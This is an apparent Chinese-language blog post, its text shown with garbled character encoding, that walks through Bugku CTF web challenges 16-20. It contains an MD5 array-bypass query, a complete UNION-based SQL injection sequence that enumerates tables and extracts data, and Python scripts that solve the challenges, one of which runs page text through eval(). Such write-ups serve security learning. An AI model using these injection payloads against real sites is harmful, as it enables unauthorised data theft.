<!--yml
category: æœªåˆ†ç±»
date: 2022-04-26 14:48:29
-->

# Bugku CTF Web è§£é¢˜æŠ¥å‘ŠäºŒï¼ˆ16-20ï¼‰_Vayn3çš„åšå®¢-CSDNåšå®¢

> æ¥æºï¼š[https://blog.csdn.net/qq_51090016/article/details/113098952](https://blog.csdn.net/qq_51090016/article/details/113098952)

## web 16 å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯

æ‰“å¼€é“¾æ¥é•¿è¿™æ ·
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/782429b3a19d61c769580cfcd88527f3.png)
è®©æˆ‘è¿™ä¸ªèœé¸¡æ‘¸ä¸ç€å¤´è„‘ã€‚ã€‚ã€‚ä¸è¿‡å‰é¢æç¤ºäº†å¤‡ä»½ï¼Œé‚£å°±æ‰“å¼€index.php.bakå§
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/1cc78d82340badc068ddb56ee62fe5e8.png)
ä¸‹è½½æ‰“å¼€
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/f9442dcfb5ee087abb3f3655a2e2c6ee.png)
å®åœ¨çœ‹ä¸æ‡‚ï¼Œä¸è¿‡æ ¹æ®ä¸‹é¢è¯„è®ºåŒºå¤§ä½¬çš„æç¤ºï¼Œè¿™æ˜¯è¦ç”¨?kekeyy1[]=[1]&kekeyy2[]=[2]ç»•è¿‡md5çš„åŠ å¯†ï¼ˆçœŸçš„ä¸æ‡‚ï¼Œè¿˜æ˜¯è¦å¤šå­¦ï¼‰ï¼Œæ‰€ä»¥åœ¨åé¢åŠ ä¸Š?kekeyy1[]=[1]&kekeyy2[]=[2]åflagå°±å‡ºæ¥äº†

![??](img/c7db47905bd0d7495c0b18bbe8e2bdda.png)
è¿™åé¢ä¸‰ä¸ªå­—æ˜¯å•¥ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿ

## Web 17 æˆç»©æŸ¥è¯¢

ç‚¹å¼€åé•¿è¿™æ ·ğŸ‘‡

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/065091fa3e50ce8be4f4a7b79a01f031.png)
åˆ†åˆ«è¾“å…¥1 2 3æŸ¥äº†ä¸‹éƒ½æ˜¯æˆç»©å•ï¼Œè¾“åˆ°4å°±æ²¡äº†ã€‚çœ‹ç€åƒæ˜¯sqlæ³¨å…¥çš„é¢˜ï¼Œå› ä¸ºæˆ‘è¿˜æ˜¯ä¸ªèœé¸¡ï¼Œåˆšäº†è§£sqlæ³¨å…¥ï¼Œåªå¥½è·Ÿç€å¤§ä½¬åšã€‚
æŒ‰ç…§å¤§ä½¬çš„åšæ³•ï¼Œå…ˆè¿›è¡Œpostè¯·æ±‚ï¼Œä¸€åˆ‡æ­£å¸¸

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/f037431f9e305d011b439c1af310f921.png)
åŠ å•å¼•å·åˆä¸è¡Œäº†
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/cfa6b080a520203d7fa905ad5692bc67.png)
åŠ #åˆå¯ä»¥äº†
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/8057eafbb543cebb089398375f8a93c2.png)
**è¿™æ ·å°±å¯ä»¥çŸ¥é“æœ‰sqlæ³¨å…¥æ¼æ´äº†ï¼ˆä¸ºä»€ä¹ˆå•Šï¼Ÿæˆ‘è¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œæœ‰æ²¡æœ‰å¤§ä½¬è§£ç­”ä¸€ä¸‹ï¼‰**
ç„¶åå°è¯•è·å–åˆ—æ•°ï¼Œå› ä¸º123éƒ½æœ‰äº†ï¼Œæ‰€ä»¥è¯•è¯•4æˆ–è€…æ›´é«˜
æ„é€ id=1â€™ order by 4#ï¼Œæ­£å¸¸
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/e9090e4748e035da9b9a1542398f387d.png)
ç»§ç»­æ„é€ id=1â€™ order by 5#ï¼Œæ²¡äº†
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/a3434f68218778474a48f364d6202b6a.png)
**æ‰€ä»¥åªæœ‰4åˆ—**

ç„¶åå°è¯•è”åˆæŸ¥è¯¢ï¼ˆéƒ½æ˜¯æŒ‰ç…§å¤§ä½¬çš„è¿‡ç¨‹æ¥çš„ï¼Œè¿˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼‰
**å…·ä½“åšæ³•æ˜¯id=0â€™ union select 1,2,3,4#**
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/925d2b013193b2bf44533f87d68b8ffe.png)
ç„¶ååˆå¼€å§‹çŒœè§£æ•°æ®åº“åï¼Œ æ•°æ®åº“çš„ç”¨æˆ·ï¼Œæ•°æ®åº“çš„ç‰ˆæœ¬
**å…·ä½“åšæ³•æ˜¯id=0â€™ union select 12345,database(),user(),version()#**![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/c093291e07f6a6359707461ff635265a.png)

**æ ¹æ®æ•°æ®åº“skctf_flagå»æŸ¥è¯¢è¡¨å**
å…·ä½“åšæ³•ï¼šid=0â€™ union select 12345,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version()#
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/94de72910eb393bcc65859b13ee27b2e.png)
è¿™ä¸ªselect group_concat(table_name) from information_schema.tables where table_schema=database()ï¼Œå¥½åƒæ˜¯ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢è¡¨åçš„å›ºå®šæ ¼å¼

ä¸Šä¸€æ­¥å¾—åˆ°äº†è¡¨åfl4gå’Œscï¼Œflagåº”è¯¥è—åœ¨fl4gé‡Œé¢

æ ¹æ®fl4gè¡¨å»æŸ¥è¯¢å­—æ®µå(åˆ—å)ï¼š**id=0â€™ union select 12345,(select group_concat(column_name) from information_schema.columns where table_name=â€˜fl4gâ€™),user(),version()#** ï¼ˆæœ‰ç‚¹è¿·ç³Šï¼‰

å†å°è¯•è·å–å­—æ®µ(åˆ—)ä¸­çš„æ•°æ®ï¼š**id=0â€™ union select 12345,(select group_concat(skctf_flag) from fl4g),user(),version()#**å°±è·å¾—flagäº†

[å‚è€ƒçš„å¤§ä½¬](https://blog.csdn.net/Mitchell_Donovan/article/details/112446855)ï¼Œæ„Ÿè°¢å¤§ä½¬çš„wpã€‚

## Web 18 ç§‹åå±±è½¦ç¥

æ‰“å¼€é•¿è¿™æ ·![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/7c352b2e1a049f8491479394d18361d9.png)
å®åœ¨è®©äººæ‘¸ä¸ç€å¤´è„‘ï¼Œåªå¥½çœ‹çœ‹ä¸‹é¢è¯„è®ºåŒºå¤§ä½¬çš„æç¤º
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/a3c0609ee09bd1a53980a7d95faa4d25.png)
æ„æ€å°±æ˜¯è¦å†™ä¸ªè„šæœ¬æ˜¯å§ã€‚ã€‚å¯æˆ‘çš„pythonåªå­¦äº†ä¸€ç‚¹ï¼Œåªå¥½å«–ä¸€ä¸‹å¤§ä½¬çš„ã€‚

```
import bs4,requests
from lxml import html
from bs4 import BeautifulSoup

url='http://114.67.246.176:14245/'
req2=requests.Session()
ht = req2.get(url)
soup=BeautifulSoup(ht.content,'lxml')

forluma=soup.find('div').text
forluma=forluma.replace("=?;","")
result=eval(forluma)
d={"value":result}
r = req2.post(url, data=d)
print(r.text) 
```

ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„pythonè¿è¡Œä¸äº†ï¼Œæ€»æ˜¯è¿™æ ·
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/1f433c4971689f49e7b0e847ac193e49.png)
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/bcb1686de18dd9dfd90bc6744ab4115f.png)
ä¸ºä»€ä¹ˆä¸è¡Œå•Šå•Šå•Šã€‚ã€‚ã€‚æˆ‘è¦åäº†ï¼Œæäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°åŸå› ï¼Œå¸Œæœ›æœ‰å¤§ç¥èƒ½æŒ‡ç‚¹ä¸€ä¸‹ã€‚
[ä»£ç å‡ºå¤„](https://blog.csdn.net/m0_49762339/article/details/111650875)

æ‰€ä»¥è¿™ä¸€é¢˜æœ€åæˆ‘è¿˜æ˜¯æ²¡æœ‰å¾—åˆ°flagã€‚ã€‚ï¼ˆè¿™è¯¥æ­»çš„pythonï¼‰

## Web 19 é€Ÿåº¦è¦å¿«

æ‰“å¼€é“¾æ¥ï¼Œçœ‹F12ï¼Œå‘ç°å“åº”å¤´é‡Œæœ‰ä¸ªflagï¼Ÿï¼Ÿ
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/dc4c4a35dd067e7ca45ebf6448bc54d5.png)
çœ‹ä¸Šå»åƒbaseï¼Œè¯•è¯•è§£ç å†è¯´ï¼š
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/47b33d587aa02699e281bb67b85cc871.png)
è¿™å°±å‡ºæ¥äº†ï¼Ÿï¼Ÿæäº¤çœ‹çœ‹ã€‚ã€‚ã€‚ã€‚æœç„¶æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œè¿™éƒ½19é¢˜äº†æ€ä¹ˆå¯èƒ½é‚£ä¹ˆç®€å• ã€‚
åªå¥½çœ‹çœ‹å¤§ä½¬ä»¬çš„wpï¼Œæ‰çŸ¥é“flagæ˜¯ä¼šå˜çš„ï¼Œéœ€è¦å†™ä¸€ä¸ªè„šæœ¬ã€‚

```
import requests
import base64
url="http://120.24.86.145:8002/web6/"
r=requests.session()
headers=r.get(url).headers

mid=base64.b64decode(headers['flag'])
mid=mid.decode()

flag = base64.b64decode(mid.split(':')[1])
data={'margin':flag}
print (r.post(url,data).text) 
```

å†™åˆ°è¿™ä¸€é¢˜çš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“ä¸Šä¸€é¢˜é‚£ä¸ªè„šæœ¬æˆ‘ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†äº†ï¼Œæˆ‘çš„pythonæ²¡æœ‰ä¸‹è½½requestsåº“ã€‚ã€‚
å¤šè¿è¡Œå‡ æ¬¡å°±flagå‡ºæ¥äº†ã€‚

## Web 20 cookiesæ¬ºéª—

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/ef1a9341f8d123bca99a830f9abbc147.png)
æ‰“å¼€ä¸€çœ‹ï¼Œæ˜¯ä¸€ä¸²ä¹±ç ã€‚ä¸è¿‡ä»”ç»†çœ‹ç½‘å€ï¼Œé‡Œé¢å¥½åƒæœ‰ä¸ªbaseå¯†ç ï¼Œè§£å¯†å¾—åˆ°ï¼škeys.txt

è®¿é—®ä¸€ä¸‹keys.txt ï¼Ÿä¸è¡Œï¼Œæ²¡ååº”ã€‚ç„¶åå°±çœŸçš„ä¸æ˜¯æˆ‘è¿™ç§èœé¸Ÿèƒ½åšå‡ºæ¥çš„äº†ï¼Œç…§ç€å¤§ä½¬çš„wpç»§ç»­

å°è¯•ç”¨ä¿®æ”¹å‚æ•°filenameçš„å€¼ä¸ºindex.phpï¼ˆæ³¨æ„æ­¤å¤„è¦ç”¨base64åŠ å¯†ä¸ºaW5kZXgucGhwï¼‰
å‘ç°å‚æ•°lineæ²¡æœ‰ç»™å€¼ï¼Œéšæ„èµ‹å€¼å¦‚3ï¼Œå‡ºç°
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/7c1fd26f98f3a6236fb5a1f8e7087396.png)
ä¸€ä¸ªä¸ªè¯•å¤ªéº»çƒ¦ï¼Œä¸Šè„šæœ¬å°†index.phpçš„æºç è¯»å–å‡ºæ¥ï¼ˆåˆè¦ä¸Šè„šæœ¬ï¼Ÿï¼Ÿï¼‰

```
 import requests

def getIndex(url):
    res = requests.get(url)
    return res.text

for i in range(0,30):
    url = 'http://123.206.87.240:8002/web11\
/index.php?line='+str(i)+'&filename=aW5kZXgucGhw'

    print(getIndex(url)) 
```

æºç 

```
<?php

error_reporting(0);

$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',

);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}

if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?> 
```

åˆ†ææºä»£ç ï¼Œå½“cookieçš„margin=marginæ—¶ï¼Œå¯ä»¥è®¿é—®ä¸€ä¸ªkeys.phpæ–‡ä»¶
æ³¨æ„æŠŠå‚æ•°filenameçš„å€¼æ”¹ä¸ºbase64åŠ å¯†åçš„keys.php
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](img/b492e43edafee00c45b41225db438c36.png)
è¿™æ ·å°±è¡Œäº†ï¼ˆåšå¾—å¥½æ‡µï¼‰